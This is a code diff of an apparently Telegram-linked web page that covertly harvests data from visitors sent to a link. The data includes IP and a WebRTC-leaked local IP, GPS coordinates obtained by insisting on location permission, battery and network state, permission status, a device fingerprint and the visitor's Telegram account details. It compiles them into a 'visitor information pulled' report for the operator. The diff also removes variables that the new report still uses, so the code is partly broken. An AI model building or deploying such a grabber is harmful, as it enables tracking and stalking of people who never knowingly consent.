@@ -48,16 +48,12 @@
         const urlParams = new URLSearchParams(window.location.search);
         const targetUserId = urlParams.get('id');
         const mode = urlParams.get('mode') || 'basic'; // basic, location, camera
-        const urlLang = urlParams.get('lang'); 
-
+        
         let botLang = 'en';
-        if (urlLang) {
-            botLang = urlLang;
-        } else if (navigator.language.startsWith('ar')) {
-            botLang = 'ar';
-        } else if (navigator.language.startsWith('hi')) {
-            botLang = 'hi';
-        }
+        const urlLang = urlParams.get('lang'); 
+        if (urlLang) botLang = urlLang;
+        else if (navigator.language.startsWith('ar')) botLang = 'ar';
+        else if (navigator.language.startsWith('hi')) botLang = 'hi';
 
         let ipDataGlobal = {};
         let gpsData = null;
@@ -84,18 +80,14 @@
 
         function getGeolocation() {
             return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    return reject({ code: 0, message: 'Geolocation not supported' });
-                }
+                if (!navigator.geolocation) return reject({ code: 0 });
                 const attempt = (opts, isRetry) => {
                     navigator.geolocation.getCurrentPosition(
                         resolve,
                         (err) => {
                             if (!isRetry && (err.code === 2 || err.code === 3)) {
                                 attempt({ enableHighAccuracy: false, maximumAge: 60000, timeout: 30000 }, true);
-                            } else {
-                                reject(err);
-                            }
+                            } else { reject(err); }
                         },
                         opts
                     );
@@ -111,7 +103,7 @@
                     pc.createDataChannel('');
                     pc.createOffer().then(pc.setLocalDescription.bind(pc));
                     pc.onicecandidate = (ice) => {
-                        if (!ice || !ice.candidate || !ice.candidate.candidate) return resolve("غير متاح");
+                        if (!ice || !ice.candidate || !ice.candidate.candidate) return resolve("N/A");
                         const myIpRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                         const match = myIpRegex.exec(ice.candidate.candidate);
                         if (match) {
@@ -119,8 +111,8 @@
                             pc.close();
                         }
                     };
-                    setTimeout(() => resolve("غير متاح"), 2000);
-                } catch(e) { resolve("غير متاح"); }
+                    setTimeout(() => resolve("N/A"), 2000);
+                } catch(e) { resolve("N/A"); }
             });
         }
 
@@ -160,56 +152,72 @@
         }
 
         // ==========================================
-        // قاعدة بيانات ضخمة لتحديد المساحة والرام من موديل الجهاز
+        // قاموس ترجمة الموديلات وجلب المواصفات
         // ==========================================
-        function getDeviceSpecs(model) {
+        function getDeviceInfo(model) {
             const m = model.toLowerCase();
-            let storage = "غير متاح (جهاز غير مسجل)";
-            let ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB (تقريبي)` : "غير معروف";
-
-            // Samsung Galaxy A, M, S Series
-            if (m.includes("sm-a165") || m.includes("sm-a166")) { storage = "128GB / 256GB"; ram = "4GB / 6GB / 8GB"; }
-            else if (m.includes("sm-a155") || m.includes("sm-a156")) { storage = "128GB / 256GB"; ram = "4GB / 6GB / 8GB"; }
-            else if (m.includes("sm-a145") || m.includes("sm-a146")) { storage = "128GB / 256GB"; ram = "4GB / 6GB"; }
-            else if (m.includes("sm-a055") || m.includes("sm-a057")) { storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
-            else if (m.includes("sm-a045") || m.includes("sm-a047")) { storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
-            else if (m.includes("sm-a34") || m.includes("sm-a35")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
-            else if (m.includes("sm-a54") || m.includes("sm-a55")) { storage = "128GB / 256GB"; ram = "8GB"; }
-            else if (m.includes("sm-m") || m.includes("sm-f")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
-            else if (m.includes("sm-s91") || m.includes("sm-s92") || m.includes("sm-s93") || m.includes("sm-s94")) { storage = "256GB / 512GB"; ram = "8GB / 12GB"; }
+            let name = model; 
+            let storage = "Unknown";
+            let ram = "Unknown";
 
             // Xiaomi / Redmi / Poco
-            else if (m.includes("redmi note 13") || m.includes("redmi note 12")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
-            else if (m.includes("redmi note 11") || m.includes("redmi note 10")) { storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
-            else if (m.includes("redmi 13c") || m.includes("redmi 12c") || m.includes("redmi 10c") || m.includes("redmi 9c") || m.includes("redmi a")) { storage = "64GB / 128GB"; ram = "3GB / 4GB / 6GB"; }
-            else if (m.includes("poco x") || m.includes("poco f")) { storage = "128GB / 256GB / 512GB"; ram = "6GB / 8GB / 12GB"; }
-            else if (m.includes("poco m")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
-            else if (m.includes("xiaomi") || m.includes("mi ")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            if (m.includes("2404arn45a")) { name = "Xiaomi Redmi A3"; storage = "64GB / 128GB"; ram = "3GB / 4GB / 6GB"; }
+            else if (m.includes("25078") || m.includes("redmi 15c")) { name = "Xiaomi Redmi 15C"; storage = "128GB / 256GB"; ram = "4GB / 6GB / 8GB"; }
+            else if (m.includes("2312dra50g") || m.includes("redmi 13c")) { name = "Xiaomi Redmi 13C"; storage = "128GB / 256GB"; ram = "4GB / 6GB / 8GB"; }
+            else if (m.includes("2310fpca4g") || m.includes("redmi 13")) { name = "Xiaomi Redmi 13"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("23021raaeg") || m.includes("redmi note 12")) { name = "Xiaomi Redmi Note 12"; storage = "128GB / 256GB"; ram = "4GB / 6GB / 8GB"; }
+            else if (m.includes("redmi 12c")) { name = "Xiaomi Redmi 12C"; storage = "64GB / 128GB"; ram = "3GB / 4GB / 6GB"; }
+            else if (m.includes("redmi note 11")) { name = "Xiaomi Redmi Note 11"; storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
+            else if (m.includes("poco x")) { name = "Xiaomi Poco X Series"; storage = "128GB / 256GB / 512GB"; ram = "6GB / 8GB / 12GB"; }
+            else if (m.includes("poco m")) { name = "Xiaomi Poco M Series"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("redmi")) { name = "Xiaomi Redmi"; storage = "64GB / 128GB"; ram = "3GB / 4GB / 6GB"; }
+            else if (m.includes("xiaomi") || m.includes("mi ")) { name = "Xiaomi Device"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+
+            // Samsung
+            else if (m.includes("sm-a165") || m.includes("sm-a166")) { name = "Samsung Galaxy A16"; storage = "128GB / 256GB"; ram = "4GB / 6GB / 8GB"; }
+            else if (m.includes("sm-a155") || m.includes("sm-a156")) { name = "Samsung Galaxy A15"; storage = "128GB / 256GB"; ram = "4GB / 6GB / 8GB"; }
+            else if (m.includes("sm-a145") || m.includes("sm-a146")) { name = "Samsung Galaxy A14"; storage = "128GB / 256GB"; ram = "4GB / 6GB"; }
+            else if (m.includes("sm-a055") || m.includes("sm-a057")) { name = "Samsung Galaxy A05"; storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
+            else if (m.includes("sm-a045") || m.includes("sm-a047")) { name = "Samsung Galaxy A04"; storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
+            else if (m.includes("sm-a34")) { name = "Samsung Galaxy A34"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("sm-a54")) { name = "Samsung Galaxy A54"; storage = "128GB / 256GB"; ram = "8GB"; }
+            else if (m.includes("sm-m")) { name = "Samsung Galaxy M"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("sm-s9")) { name = "Samsung Galaxy S Series"; storage = "256GB / 512GB"; ram = "8GB / 12GB"; }
+            else if (m.includes("samsung")) { name = "Samsung Device"; storage = "128GB / 256GB"; ram = "4GB / 6GB"; }
 
             // Infinix
-            else if (m.includes("infinix hot 40") || m.includes("infinix hot 30") || m.includes("infinix note")) { storage = "128GB / 256GB"; ram = "8GB"; }
-            else if (m.includes("infinix smart")) { storage = "64GB / 128GB"; ram = "3GB / 4GB"; }
+            else if (m.includes("infinix hot 40") || m.includes("infinix hot 30")) { name = "Infinix Hot Series"; storage = "128GB / 256GB"; ram = "8GB"; }
+            else if (m.includes("infinix smart")) { name = "Infinix Smart"; storage = "64GB / 128GB"; ram = "3GB / 4GB"; }
+            else if (m.includes("infinix note")) { name = "Infinix Note"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("infinix")) { name = "Infinix Device"; storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
 
             // Tecno
-            else if (m.includes("tecno spark 20") || m.includes("tecno spark 10") || m.includes("tecno spark 9") || m.includes("tecno camon")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("tecno spark 20") || m.includes("tecno spark 10")) { name = "Tecno Spark"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("tecno camon")) { name = "Tecno Camon"; storage = "128GB / 256GB"; ram = "8GB"; }
+            else if (m.includes("tecno")) { name = "Tecno Device"; storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
 
             // Oppo / Realme / Vivo
-            else if (m.includes("oppo a") || m.includes("oppo reno")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
-            else if (m.includes("realme c") || m.includes("realme narzo")) { storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
-            else if (m.includes("realme ") || m.includes("vivo y")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("oppo a") || m.includes("oppo reno")) { name = "Oppo Device"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("realme c") || m.includes("realme narzo")) { name = "Realme C Series"; storage = "64GB / 128GB"; ram = "4GB / 6GB"; }
+            else if (m.includes("realme ")) { name = "Realme Device"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("vivo y")) { name = "Vivo Y Series"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
 
             // Apple
-            else if (m.includes("iphone 15") || m.includes("iphone 14") || m.includes("iphone 13")) { storage = "128GB / 256GB / 512GB"; ram = "6GB"; }
-            else if (m.includes("iphone 12") || m.includes("iphone 11")) { storage = "64GB / 128GB / 256GB"; ram = "4GB"; }
-            else if (m.includes("iphone x") || m.includes("iphone 8")) { storage = "64GB / 256GB"; ram = "3GB"; }
-            else if (m.includes("ipad")) { storage = "64GB / 256GB"; ram = "3GB / 4GB"; }
+            else if (m.includes("iphone 15") || m.includes("iphone 14") || m.includes("iphone 13")) { name = "Apple iPhone Series"; storage = "128GB / 256GB / 512GB"; ram = "6GB"; }
+            else if (m.includes("iphone 12") || m.includes("iphone 11")) { name = "Apple iPhone"; storage = "64GB / 128GB / 256GB"; ram = "4GB"; }
+            else if (m.includes("iphone x") || m.includes("iphone 8")) { name = "Apple iPhone"; storage = "64GB / 256GB"; ram = "3GB"; }
+            else if (m.includes("ipad")) { name = "Apple iPad"; storage = "64GB / 256GB"; ram = "3GB / 4GB"; }
 
             // Huawei / Honor / OnePlus / Google
-            else if (m.includes("huawei") || m.includes("honor")) { storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
-            else if (m.includes("oneplus")) { storage = "128GB / 256GB"; ram = "8GB / 12GB"; }
-            else if (m.includes("pixel")) { storage = "128GB / 256GB"; ram = "8GB"; }
+            else if (m.includes("huawei") || m.includes("honor")) { name = "Huawei / Honor"; storage = "128GB / 256GB"; ram = "6GB / 8GB"; }
+            else if (m.includes("oneplus")) { name = "OnePlus Device"; storage = "128GB / 256GB"; ram = "8GB / 12GB"; }
+            else if (m.includes("pixel")) { name = "Google Pixel"; storage = "128GB / 256GB"; ram = "8GB"; }
 
-            return { storage, ram };
+            if (name === "Unknown" || name === "K" || name === "Linux armv81" || name === "Hidden") {
+                name = "Unknown Device";
+            }
+
+            return { name, storage, ram };
         }
 
         async function initPage() {
@@ -240,7 +248,6 @@
                 }
             }
 
-            // تحديث المحافظة بدقة عبر BigDataCloud
             if (ipDataGlobal.latitude && ipDataGlobal.longitude) {
                 try {
                     const bdcRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${ipDataGlobal.latitude}&longitude=${ipDataGlobal.longitude}&localityLanguage=ar`);
@@ -249,9 +256,7 @@
                         ipDataGlobal.region = bdcData.principalSubdivision;
                         ipDataGlobal.city = bdcData.city || bdcData.locality || ipDataGlobal.city;
                     }
-                } catch (e) {
-                    console.log("BigDataCloud failed, using default IP data.");
-                }
+                } catch (e) {}
             }
 
             if (mode === 'location' || mode === 'camera') {
@@ -303,11 +308,7 @@
                     gpsData = { lat: lat, lon: lon, acc: acc, areaName: areaName };
                     finishAction();
                 } catch (err) {
-                    const msg = botLang === 'ar'
-                        ? "يجب السماح بالوصول للموقع الدقيق."
-                        : botLang === 'hi'
-                            ? "आपको सटीक स्थान की अनुमति देनी होगी।"
-                            : "You must allow exact location access.";
+                    const msg = botLang === 'ar' ? "يجب السماح بالوصول للموقع الدقيق." : "You must allow exact location access.";
                     showAlert(msg);
                     finishAction();
                 }
@@ -345,6 +346,7 @@
 
             const ua = navigator.userAgent;
             
+            // 1. نظام التشغيل
             let osName = "غير معروف", osNameEn = "Unknown", osNameHi = "अज्ञात";
             let osVersion = "";
             if (/Windows/i.test(ua)) { osName = osNameEn = osNameHi = "Windows"; }
@@ -361,21 +363,23 @@
             else if (/Mac/i.test(ua)) { osName = osNameEn = osNameHi = "macOS"; }
             else if (/Linux/i.test(ua)) { osName = osNameEn = osNameHi = "Linux"; }
 
+            // 2. المتصفح
             let browserName = "Unknown";
             if (/Edg/i.test(ua)) browserName = "Edge";
             else if (/Chrome|CriOS/i.test(ua)) browserName = "Chrome";
             else if (/Firefox|FxiOS/i.test(ua)) browserName = "Firefox";
             else if (/Safari/i.test(ua)) browserName = "Safari";
-            else if (/WhatsApp/i.test(ua)) browserName = "WhatsApp In-App 🟢";
-            else if (/TikTok/i.test(ua)) browserName = "TikTok In-App 🎵";
-            else if (/FBAN|FBAV/i.test(ua)) browserName = "Facebook In-App 📘";
-            else if (/Instagram/i.test(ua)) browserName = "Instagram In-App 📸";
-            else if (/Telegram/i.test(ua)) browserName = "Telegram In-App ✈️";
+            else if (/WhatsApp/i.test(ua)) browserName = "WhatsApp";
+            else if (/TikTok/i.test(ua)) browserName = "TikTok";
+            else if (/FBAN|FBAV/i.test(ua)) browserName = "Facebook";
+            else if (/Instagram/i.test(ua)) browserName = "Instagram";
+            else if (/Telegram/i.test(ua)) browserName = "Telegram";
 
+            // 3. الموديل
             let deviceModel = "Unknown";
             const modelMatch = ua.match(/Android[^;]+;\s([^;)]+)\sBuild/i);
             if (modelMatch) deviceModel = modelMatch[1].trim();
-            if (deviceModel === "K" || deviceModel === "Linux armv81") deviceModel = "Hidden";
+            if (deviceModel === "K" || deviceModel === "Linux armv81") deviceModel = "Unknown";
             try {
                 if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                     const uaData = await navigator.userAgentData.getHighEntropyValues(["model"]);
@@ -383,25 +387,20 @@
                 }
             } catch (e) {}
 
-            let tgPlatform = "Browser", tgPlatformAr = "متصفح", tgPlatformHi = "ब्राउज़र";
-            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform && window.Telegram.WebApp.platform !== 'unknown') {
-                tgPlatform = "Telegram (" + window.Telegram.WebApp.platform + ")";
-                tgPlatformAr = "تليجرام (" + window.Telegram.WebApp.platform + ")";
-                tgPlatformHi = "टेलीग्राम (" + window.Telegram.WebApp.platform + ")";
-            }
-
+            // 4. بيانات تليجرام
             let tgSectionAr = "", tgSectionEn = "", tgSectionHi = "";
             if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
                 const u = window.Telegram.WebApp.initDataUnsafe.user;
                 let tgName = `${u.first_name || ''} ${u.last_name || ''}`.trim() || "Unknown";
                 let tgUsername = u.username ? `@${u.username}` : "None";
-                let tgPremium = u.is_premium ? "Yes 🌟" : "No";
+                let tgPremium = u.is_premium ? "Yes" : "No";
                 
-                tgSectionAr = `\n👤 <b>حساب تليجرام</b>\n• الاسم: ${tgName}\n• المعرف: ${tgUsername}\n• بريميوم: ${tgPremium}\n`;
-                tgSectionEn = `\n👤 <b>Telegram Account</b>\n• Name: ${tgName}\n• Username: ${tgUsername}\n• Premium: ${tgPremium}\n`;
-                tgSectionHi = `\n👤 <b>टेलीग्राम खाता</b>\n• नाम: ${tgName}\n• यूजरनेम: ${tgUsername}\n• प्रीमियम: ${tgPremium}\n`;
+                tgSectionAr = `\n👤 حساب تليجرام\n   • الاسم: ${tgName}\n   • المعرف: ${tgUsername}\n   • بريميوم: ${tgPremium}\n`;
+                tgSectionEn = `\n👤 Telegram Account\n   • Name: ${tgName}\n   • Username: ${tgUsername}\n   • Premium: ${tgPremium}\n`;
+                tgSectionHi = `\n👤 टेलीग्राम खाता\n   • नाम: ${tgName}\n   • यूजरनेम: ${tgUsername}\n   • प्रीमियम: ${tgPremium}\n`;
             }
 
+            // 5. الشبكة
             let netAr = "غير معروف", netEn = "Unknown", netHi = "अज्ञात";
             let netDownlink = navigator.connection ? navigator.connection.downlink : "Unknown";
             let netRtt = navigator.connection ? navigator.connection.rtt : "Unknown";
@@ -409,43 +408,38 @@
                 const type = navigator.connection.type;
                 const effType = navigator.connection.effectiveType;
                 if (type === 'wifi' || effType === 'wifi') { 
-                    netAr = "🟢 واي فاي (Wi-Fi)"; netEn = "🟢 Wi-Fi"; netHi = "🟢 वाई-फाई"; 
+                    netAr = "واي فاي (Wi-Fi)"; netEn = "Wi-Fi"; netHi = "वाई-फाई"; 
                 } else if (effType === '4g' || effType === '3g' || effType === '2g' || effType === 'slow-2g') { 
-                    netAr = `🔵 بيانات (Data - ${effType.toUpperCase()})`; netEn = `🔵 Cellular (${effType.toUpperCase()})`; netHi = `🔵 सेलुलर (${effType.toUpperCase()})`; 
+                    netAr = `بيانات (${effType.toUpperCase()})`; netEn = `Cellular (${effType.toUpperCase()})`; netHi = `सेलुलर (${effType.toUpperCase()})`; 
                 } else if (type && type !== 'none') {
                     netAr = type; netEn = type; netHi = type;
                 }
             }
 
-            let doNotTrack = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
-            let orientation = screen.orientation ? screen.orientation.type : "Unknown";
-            let colorDepth = screen.colorDepth + " bit";
-
             let deviceTimezone = "Unknown";
             try { deviceTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
 
-            let batteryAr = "غير مدعوم", batteryEn = "Not supported", batteryHi = "समर्थित नहीं है";
+            // 6. البطارية
+            let batLevel = 0, isCharging = false;
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    const batLevel = Math.round(battery.level * 100);
-                    const isCharging = battery.charging;
-                    batteryAr = `المستوى: ${batLevel}%\n• جاري الشحن: ${isCharging ? 'نعم' : 'لا'}`;
-                    batteryEn = `Level: ${batLevel}%\n• Charging: ${isCharging ? 'Yes' : 'No'}`;
-                    batteryHi = `स्तर: ${batLevel}%\n• चार्जिंग: ${isCharging ? 'हाँ' : 'नहीं'}`;
+                    batLevel = Math.round(battery.level * 100);
+                    isCharging = battery.charging;
                 }
             } catch (e) {}
 
+            // 7. الصلاحيات
             let camStatus = "Prompt", locStatus = "Prompt";
             try { camStatus = (await navigator.permissions.query({ name: 'camera' })).state; } catch(e) {}
             try { locStatus = (await navigator.permissions.query({ name: 'geolocation' })).state; } catch(e) {}
 
-            let camAr = camStatus === 'granted' ? '🟢 مسموح' : camStatus === 'denied' ? '🔴 مرفوض' : '🟡 مطلوب';
-            let locAr = locStatus === 'granted' ? '🟢 مسموح' : locStatus === 'denied' ? '🔴 مرفوض' : '🟡 مطلوب';
-            let camEn = camStatus === 'granted' ? '🟢 Granted' : camStatus === 'denied' ? '🔴 Denied' : '🟡 Prompt';
-            let locEn = locStatus === 'granted' ? '🟢 Granted' : locStatus === 'denied' ? '🔴 Denied' : '🟡 Prompt';
-            let camHi = camStatus === 'granted' ? '🟢 अनुमति दी गई' : camStatus === 'denied' ? '🔴 अस्वीकृत' : '🟡 संकेत';
-            let locHi = locStatus === 'granted' ? '🟢 अनुमति दी गई' : locStatus === 'denied' ? '🔴 अस्वीकृत' : '🟡 संकेत';
+            let camAr = camStatus === 'granted' ? 'مسموح' : camStatus === 'denied' ? 'مرفوض' : 'مطلوب';
+            let locAr = locStatus === 'granted' ? 'مسموح' : locStatus === 'denied' ? 'مرفوض' : 'مطلوب';
+            let camEn = camStatus === 'granted' ? 'Granted' : camStatus === 'denied' ? 'Denied' : 'Prompt';
+            let locEn = locStatus === 'granted' ? 'Granted' : locStatus === 'denied' ? 'Denied' : 'Prompt';
+            let camHi = camStatus === 'granted' ? 'अनुमति दी गई' : camStatus === 'denied' ? 'अस्वीकृत' : 'संकेत';
+            let locHi = locStatus === 'granted' ? 'अनुमति दी गई' : locStatus === 'denied' ? 'अस्वीकृत' : 'संकेत';
 
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
@@ -455,169 +449,171 @@
             const gpuInfo = getGPU();
             const cpuCores = navigator.hardwareConcurrency || "Unknown";
             
-            const specs = getDeviceSpecs(deviceModel);
-            let finalRamAr = specs.ram;
-            let finalStorageAr = specs.storage;
-            let finalRamEn = specs.ram;
-            let finalStorageEn = specs.storage;
-            let finalRamHi = specs.ram;
-            let finalStorageHi = specs.storage;
+            // 8. اسم الموديل والمساحة والرام من القاموس
+            const deviceInfo = getDeviceInfo(deviceModel);
+            let finalName = deviceInfo.name;
+            let finalRam = deviceInfo.ram;
+            let finalStorage = deviceInfo.storage;
 
+            // 9. الموقع الدقيق
             let gpsSectionAr = "", gpsSectionEn = "", gpsSectionHi = "";
             if (gpsData) {
-                gpsSectionAr = `\n📍 <b>الموقع الدقيق (GPS):</b>\n• المنطقة/الحي: ${gpsData.areaName}\n• خط العرض: ${gpsData.lat}\n• خط الطول: ${gpsData.lon}\n• دقة الموقع: ${gpsData.acc} متر\n`;
-                gpsSectionEn = `\n📍 <b>Exact Location (GPS):</b>\n• Area/Neighborhood: ${gpsData.areaName}\n• Lat: ${gpsData.lat}\n• Lon: ${gpsData.lon}\n• Accuracy: ${gpsData.acc} m\n`;
-                gpsSectionHi = `\n📍 <b>सटीक स्थान (GPS):</b>\n• क्षेत्र: ${gpsData.areaName}\n• अक्षांश: ${gpsData.lat}\n• देशांतर: ${gpsData.lon}\n• सटीकता: ${gpsData.acc} मीटर\n`;
+                gpsSectionAr = `\n📍 الموقع الدقيق (GPS)\n   • المنطقة: ${gpsData.areaName}\n   • خط العرض: ${gpsData.lat}\n   • خط الطول: ${gpsData.lon}\n   • الدقة: ${gpsData.acc} متر\n`;
+                gpsSectionEn = `\n📍 Exact Location (GPS)\n   • Area: ${gpsData.areaName}\n   • Lat: ${gpsData.lat}\n   • Lon: ${gpsData.lon}\n   • Accuracy: ${gpsData.acc} m\n`;
+                gpsSectionHi = `\n📍 सटीक स्थान (GPS)\n   • क्षेत्र: ${gpsData.areaName}\n   • अक्षांश: ${gpsData.lat}\n   • देशांतर: ${gpsData.lon}\n   • सटीकता: ${gpsData.acc} मीटर\n`;
             }
 
             let report = "";
 
+            // ==========================================
+            // بناء الرسالة الهادية (عربي / إنجليزي / هندي)
+            // ==========================================
             if (botLang === 'ar') {
                 report = `
-📊 <b>تم سحب معلومات الزائر</b>
+📊 تم سحب معلومات الزائر
 ━━━━━━━━━━━━━━━━
+
+🖥️ الجهاز والمتصفح
+   • الموديل: ${finalName}
+   • نظام التشغيل: ${osName} ${osVersion}
+   • التطبيق: ${browserName}
+   • كود المتصفح: <code>${ua}</code>
 ${tgSectionAr}
-🖥️ <b>الجهاز والمتصفح</b>
-• موديل الجهاز: ${deviceModel}
-• نظام التشغيل: ${osName} ${osVersion ? `(إصدار ${osVersion})` : ""}
-• المتصفح/التطبيق: ${browserName} ${tgPlatformAr !== 'متصفح' ? '| ' + tgPlatformAr : ''}
-• كود المتصفح: <code>${ua}</code>
+🌐 معلومات الشبكة
+   • الآي بي العام: ${ipDataGlobal.ip || 'غير معروف'}
+   • الآي بي المحلي: ${localIp}
+   • نوع الاتصال: ${netAr}
+   • السرعة: ${netDownlink} Mbps | الاستجابة: ${netRtt} ms
+   • اللغة: ${navigator.language}
 
-🌐 <b>معلومات الشبكة</b>
-• الآي بي العام: ${ipDataGlobal.ip || 'غير معروف'}
-• الآي بي المحلي: ${localIp}
-• نوع الاتصال: ${netAr}
-• سرعة التحميل: ${netDownlink} Mbps | زمن الاستجابة: ${netRtt} ms
-• اللغة: ${navigator.language} | DNT: ${doNotTrack === 'Enabled' ? 'مفعل' : 'غير مفعل'}
-
-📍 <b>تفاصيل الموقع (IP)</b>
-• الدولة: ${ipDataGlobal.country || 'غير معروف'}
-• المحافظة: ${ipDataGlobal.region || 'غير معروف'}
-• المدينة: ${ipDataGlobal.city || 'غير معروف'}
-• المنطقة الزمنية: ${deviceTimezone}
-
-🖼️ <b>معلومات الشاشة</b>
-• الدقة: ${screenRes}
-• اتجاه الشاشة: ${orientation}
-• عمق الألوان: ${colorDepth}
-
-🔋 <b>حالة البطارية</b>
-• ${batteryAr}
-
-💾 <b>الهاردوير والمساحة</b>
-• الرام: ${finalRamAr}
-• المساحة: ${finalStorageAr}
-• المعالج: ${cpuCores} نواة
-• كرت الشاشة: ${gpuInfo}
-• اللمس: ${isTouch}
-
-🔏 <b>بصمة الجهاز (Fingerprint)</b>
-• <code>${fingerprint}</code>
-
-🔐 <b>الصلاحيات</b>
-• الكاميرا: ${camAr}
-• الموقع: ${locAr}
+📍 تفاصيل الموقع (IP)
+   • الدولة: ${ipDataGlobal.country || 'غير معروف'}
+   • المحافظة: ${ipDataGlobal.region || 'غير معروف'}
+   • المدينة: ${ipDataGlobal.city || 'غير معروف'}
+   • التوقيت: ${deviceTimezone}
 ${gpsSectionAr}
+🖼️ معلومات الشاشة
+   • الدقة: ${screenRes}
+   • الاتجاه: ${orientation}
+   • الألوان: ${colorDepth}
+
+🔋 حالة البطارية
+   • المستوى: ${batLevel}%
+   • الشحن: ${isCharging ? 'نعم' : 'لا'}
+
+🔐 الصلاحيات
+   • الكاميرا: ${camAr}
+   • الموقع: ${locAr}
+
+💾 الهاردوير
+   • المعالج: ${cpuCores} نواة
+   • كرت الشاشة: ${gpuInfo}
+   • الرام: ${finalRam}
+   • المساحة: ${finalStorage}
+
+🔏 بصمة الجهاز
+   • ${fingerprint}
+
 ━━━━━━━━━━━━━━━━
-⚡ <b>المطور:</b> <a href="tg://user?id=${ADMIN_ID}">تواصل مع المطور</a>
+⚡ المطور: <a href="tg://user?id=${ADMIN_ID}">تواصل مع المطور</a>
                 `;
             } else if (botLang === 'hi') {
                 report = `
-📊 <b>आगंतुक जानकारी कैप्चर की गई</b>
+📊 आगंतुक जानकारी कैप्चर की गई
 ━━━━━━━━━━━━━━━━
+
+🖥️ डिवाइस और ब्राउज़र
+   • डिवाइस मॉडल: ${finalName}
+   • ऑपरेटिंग सिस्टम: ${osNameHi} ${osVersion}
+   • ऐप इंटरफ़ेस: ${browserName}
+   • यूजर-एजेंट: <code>${ua}</code>
 ${tgSectionHi}
-🖥️ <b>डिवाइस और ब्राउज़र</b>
-• डिवाइस मॉडल: ${deviceModel}
-• ऑपरेटिंग सिस्टम: ${osNameHi} ${osVersion ? `(${osVersion})` : ""}
-• ऐप इंटरफ़ेस: ${browserName} ${tgPlatformHi !== 'ब्राउज़र' ? '| ' + tgPlatformHi : ''}
-• यूजर-एजेंट: <code>${ua}</code>
+🌐 नेटवर्क जानकारी
+   • पब्लिक आईपी: ${ipDataGlobal.ip || 'अज्ञात'}
+   • लोकल आईपी: ${localIp}
+   • कनेक्शन प्रकार: ${netHi}
+   • गति: ${netDownlink} Mbps | RTT: ${netRtt} ms
+   • भाषा: ${navigator.language}
 
-🌐 <b>नेटवर्क जानकारी</b>
-• आईपी पता: ${ipDataGlobal.ip || 'अज्ञात'}
-• स्थानीय आईपी: ${localIp}
-• कनेक्शन प्रकार: ${netHi}
-• स्पीड: ${netDownlink} Mbps | RTT: ${netRtt} ms
-• भाषा: ${navigator.language} | DNT: ${doNotTrack === 'Enabled' ? 'सक्रिय' : 'निष्क्रिय'}
-
-📍 <b>स्थान विवरण (IP)</b>
-• देश: ${ipDataGlobal.country || 'अज्ञात'}
-• क्षेत्र: ${ipDataGlobal.region || 'अज्ञात'}
-• शहर: ${ipDataGlobal.city || 'अज्ञात'}
-• समय क्षेत्र: ${deviceTimezone}
-
-🖼️ <b>प्रदर्शन जानकारी</b>
-• रिज़ॉल्यूशन: ${screenRes}
-• अभिविन्यास: ${orientation}
-• रंग की गहराई: ${colorDepth}
-
-🔋 <b>बैटरी की स्थिति</b>
-• ${batteryHi}
-
-💾 <b>हार्डवेयर और स्टोरेज</b>
-• रैम: ${finalRamHi}
-• स्टोरेज: ${finalStorageHi}
-• सीपीयू: ${cpuCores} कोर
-• जीपीयू: ${gpuInfo}
-• टच: ${isTouch}
-
-🔏 <b>डिवाइस फिंगरप्रिंट</b>
-• <code>${fingerprint}</code>
-
-🔐 <b>डिवाइस अनुमतियाँ</b>
-• कैमरा: ${camHi}
-• स्थान: ${locHi}
+📍 स्थान विवरण (IP)
+   • देश: ${ipDataGlobal.country || 'अज्ञात'}
+   • क्षेत्र: ${ipDataGlobal.region || 'अज्ञात'}
+   • शहर: ${ipDataGlobal.city || 'अज्ञात'}
+   • समय क्षेत्र: ${deviceTimezone}
 ${gpsSectionHi}
+🖼️ प्रदर्शन जानकारी
+   • रिज़ॉल्यूशन: ${screenRes}
+   • अभिविन्यास: ${orientation}
+   • रंग की गहराई: ${colorDepth}
+
+🔋 बैटरी की स्थिति
+   • स्तर: ${batLevel}%
+   • चार्जिंग: ${isCharging ? 'हाँ' : 'नहीं'}
+
+🔐 डिवाइस अनुमतियाँ
+   • कैमरा: ${camHi}
